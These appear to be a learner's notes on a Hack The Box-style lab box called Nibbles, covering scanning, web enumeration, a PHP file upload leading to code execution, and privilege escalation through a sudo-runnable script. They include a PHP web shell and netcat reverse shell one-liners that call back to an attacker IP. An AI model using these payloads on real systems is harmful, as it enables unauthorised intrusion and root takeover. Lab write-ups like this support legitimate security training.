
Basic Enumeration
- Nmap scan
	- `nmap -sV --open -oA nibbles_initial_scan 10.129.42.190`
		- sV: default top 1000 ports
		- open: only return open ports
		- oA: ouptut all scan formats, including XML output, greppable output, text output.. -> go into the file called nibbles_initial_scan
	- Then, we can do one for ALL ports and leave it running in the background.
		- `nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190`
	- Finally, for the ports we found, do a full service scan
		- `nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190`
- Banner grabbing
	- nc -nv 10.129.42.190 80 
		- See a HTTP port that's open

Web enumeration
- We saw an open HTTP port
- Can use **whatweb** to identify the web application in use
	- `whatweb 10.129.42.190`
	- nothing much shown
- Open in browser
	- Nothing, but **opening page source** with Ctrl + U shows 
		- /nibbleblog...
	- Can also check with curl
		- `curl http://10.129.42.190`
			- Sends a GET request to the server at given IP, at default HTTP port 80
		- also see that there's a nibbleblog directory
	- Now try with whatweb again
		- `whatweb http://10.129.42.190/nibbleblog`
	- We see some technolgoies in use including PHP, and that the site is running NibbleBlog

Directory enumeration
- Directory busting
	- `gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt`
- Digging around finds that there is a login page, and a username of `admin`
- We see a users.xml file, which shows blacklisting if too many attempts
	- Cannot brute force with eg. hydra
- We find a config.xml which has cases of the word `nibbles`
	- This turns out to be the admin password

Exploit enumeration
- We find an exploit online for Nibbles, with the correct version too
- We find different pages, with a Pluigins page that let us upload picture.
	- Maybe can use to upload PHP code?
	- We can test for code execution with the following snippet
		- `<?php system('id'); ?>`
	- Then we save the code to a file and upload it
		- Errors, but seems like uploading worked
	- Try to find it
		- found at `http://<host>/nibbleblog/content/private/plugins/my_image/`
		- `curl ...` -> We get the code execution!!!
	- So we add a bash reverse shell on-liner to our PHP script
		- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f`
		- which, after added to the script looks like
		- `<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>`
	- Then we start a nc listener in our terminal
		- `nc -lvnp 9443`
	- cURL the image again or browse to it in Firefox to execute the reverse shell

Upgrading shell
- `python3 -c 'import pty; pty.spawn("/bin/bash")'`

Then want to upload linenum.sh
- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
- Download this using wget on local machine
- Then run a server on local machine
	- python3 -m http.server 8000
- Then on remote, download 
	- wget https://localip:8000/LinEnum.sh
- chmod +x and run it

Final steps
- we see that monitor.sh can be run without root privileges
	- so, just add a reverse shell one liner at the end of it and **execute with sudo**, to ge reverse shell back as root user
	- `echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh`
		- tee write s the input from echo into a file 
		- -a is append mode, so it's appended to the end of monitor.sh
		- IMPORTANT: append to files to prevent overwriting and screwing things up.





Notes
- need to save the program as a .php file, not just any random thing
- curl the program to get execution
- when i run the monitor.sh with sudo, acting as root user, so running the reverse shells command appended to the monitor.sh script will give root access.



KIV:
- Hydra password brute forcing
- Repeater
- Burp suite
- CeWL to crawl through website, then use these information to crack password hash with Hashcat


